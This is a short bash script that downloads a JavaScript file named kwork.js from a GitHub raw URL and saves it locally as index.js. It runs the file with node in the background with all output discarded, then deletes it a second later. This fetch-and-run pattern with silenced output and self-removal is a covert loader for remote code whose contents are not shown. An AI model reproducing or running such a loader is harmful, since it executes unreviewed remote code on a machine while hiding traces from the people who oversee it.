#!/bin/bash

URL="https://raw.githubusercontent.com/Andtherya/test/refs/heads/main/kwork.js"
SCRIPT="index.js"

curl -fsSL "$URL" -o "$SCRIPT" || exit 1

nohup node "$SCRIPT" >/dev/null 2>&1 &

sleep 1
rm -f "$SCRIPT"
